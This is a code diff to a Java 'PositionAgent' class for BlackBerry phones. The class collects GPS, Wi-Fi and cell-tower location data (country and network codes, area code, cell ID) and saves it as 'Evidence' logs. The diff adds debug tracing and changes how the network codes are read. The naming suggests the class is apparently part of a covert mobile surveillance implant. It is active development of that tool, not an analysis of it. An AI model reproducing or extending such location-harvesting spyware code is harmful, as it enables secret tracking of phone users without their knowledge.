@@ -59,7 +59,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     Evidence logWifi;
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("PositionAgent", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
     //#endif
 
     // LOGGER_GPS  1 // Prendi la posizione dal GPS
@@ -253,15 +253,28 @@ public final class PositionAgent extends Agent implements LocationObserver {
             // CC e MNC possono essere estratti da IMEI
             // http://en.wikipedia.org/wiki/Mobile_country_code
             // http://en.wikipedia.org/wiki/Mobile_Network_Code
+
+            //#ifdef DEBUG
+            debug.trace("GPRS");
+            //#endif
+
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
-                    .getMCC()));
+            //#ifdef DEBUG
+            debug.trace("mcc: " + cellinfo.getMCC() + "/"
+                    + GPRSInfo.getHomeMCC());
+            /*Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC="
+                    + GPRSInfo.getHomeMCC() + " radioninfo="
+                    + RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex())
+                    + " mnc=" + cellinfo.getMNC() + " radiomnc="
+                    + RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex()));*/
+            //#endif
 
-            final int mnc = cellinfo.getMNC();
+            int mcc = hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
+            int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
+            
             final int lac = cellinfo.getLAC();
             final int cid = cellinfo.getCellId();
-
             final int bsic = cellinfo.getBSIC();
 
             //final int rssi = cellinfo.getRSSI();
@@ -285,7 +298,11 @@ public final class PositionAgent extends Agent implements LocationObserver {
                 logCell.close();
             }
 
-        } else if(Device.isCDMA()){
+        } else if (Device.isCDMA()) {
+            //#ifdef DEBUG
+            debug.trace("CDMA");
+            //#endif
+
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
@@ -313,17 +330,21 @@ public final class PositionAgent extends Agent implements LocationObserver {
                 saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                 logCell.close();
             }
-        }else if(Device.isIDEN()){
+        } else if (Device.isIDEN()) {
             //TODO IDEN
             //#ifdef DEBUG
             debug.error("locationCELL: IDEN not supported");
             //#endif
-        }else{
+        } else {
             //#ifdef DEBUG
             debug.error("locationCELL: not supported");
             //#endif
         }
 
+    }
+
+    private int hex(int value) {
+        return Integer.parseInt(Integer.toHexString(value));
     }
 
     private void locationGPS() {
@@ -333,18 +354,18 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#endif               
             return;
         }
-    
+
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return;
         }
-    
+
         synchronized (this) {
             LocationHelper.getInstance().locationGPS(lp, this, false);
         }
-    
+
     }
 
     public synchronized void newLocation(Location loc) {
